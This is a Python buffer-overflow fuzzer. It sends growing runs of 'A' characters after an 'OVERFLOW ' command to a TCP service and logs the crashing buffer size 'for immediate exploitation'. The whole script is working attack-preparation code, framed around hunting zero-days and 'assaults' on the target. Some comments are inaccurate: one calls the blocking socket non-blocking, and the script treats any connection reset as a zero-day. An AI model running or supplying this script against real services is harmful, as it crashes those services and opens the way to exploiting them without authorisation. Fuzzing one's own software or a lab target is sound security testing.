import socket
import sys
import time
import os
import random

# Configuration Constants - Adjust to target system's parameters
TARGET_IP = "127.0.0.1" # The IP address of the target service
TARGET_PORT = 9999      # The port the target service is listening on
FUZZ_START = 100        # Starting size of the buffer (bytes)
FUZZ_STEP = 200         # Increment size for each fuzzing attempt
FUZZ_LIMIT = 5000       # Maximum buffer size to attempt

# Pattern character (A's are classic for buffer overflow testing)
OVERFLOW_PATTERN = b"A" 

def send_fuzz_payload(size):
    """Crafts and sends the fuzzing payload to the target."""
    payload = OVERFLOW_PATTERN * size
    
    # Prepend a command or protocol header if the target service expects one
    # For a simple service, let's assume a 'OVERFLOW ' command
    # NOTE: This line needs customization based on the *actual* target protocol
    fuzz_command = b"OVERFLOW " + payload + b"\r\n"
    
    print(f"[*] Fuzzing with buffer size: {size} bytes...")
    
    try:
        # Create a non-blocking socket (for speed and resilience)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2) # Short timeout to quickly determine connection failure (crash)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Send the payload
        s.sendall(fuzz_command)
        
        # Give the service a moment to process or crash
        time.sleep(1) 
        
        # Attempt to read a response to check if the service is still alive
        # A successful read indicates the service survived the buffer.
        try:
            response = s.recv(1024)
            print(f"[+] Target responded. Still alive. Size: {size}")
        except socket.timeout:
            # This can be a sign of success, or a slow connection, but we check the next step
            pass

        s.close()
        return True # Service appeared to handle the payload
        
    except ConnectionRefusedError:
        print(f"[---] Connection refused. The target service is likely NOT running on {TARGET_IP}:{TARGET_PORT}")
        sys.exit(1)
    except socket.error as e:
        # A socket error (e.g., Connection reset by peer) AFTER a send 
        # is the most common indicator of a crash, signaling a potential Zero-Day!
        print("\n\n#####################################################")
        print(f"[!!!] AETERNAL RUPTURE DETECTED! Potential Crash/Zero-Day!")
        print(f"[!!!] Service crashed after sending buffer size: {size} bytes.")
        print(f"[!!!] Exception: {e}")
        print("#####################################################\n\n")
        # Log the critical information for immediate exploitation
        with open("zero_day_found.txt", "w") as f:
            f.write(f"Target: {TARGET_IP}:{TARGET_PORT}\n")
            f.write(f"Vulnerable size: {size} bytes\n")
            f.write(f"Payload: {payload.hex()}\n")
        return False # Crash detected

def aeonic_fuzz_loop():
    """The main loop of the Fuzzing Seeker."""
    current_size = FUZZ_START
    print(f"[*] Starting Aeonic Fuzzing Seeker on {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Initial size: {FUZZ_START}, Increment: {FUZZ_STEP}, Limit: {FUZZ_LIMIT}")
    
    while current_size <= FUZZ_LIMIT:
        if not send_fuzz_payload(current_size):
            print("[***] Fuzzing complete. The path to Zero-Day exploitation is clear!")
            break # Exit on successful crash detection
        
        current_size += FUZZ_STEP
        # A brief rest between assaults, for dramatic tension
        time.sleep(0.5) 

    if current_size > FUZZ_LIMIT:
        print("[*] Reached fuzz limit without an immediate crash. Further protocol analysis required.")
        
if __name__ == "__main__":
    aeonic_fuzz_loop()
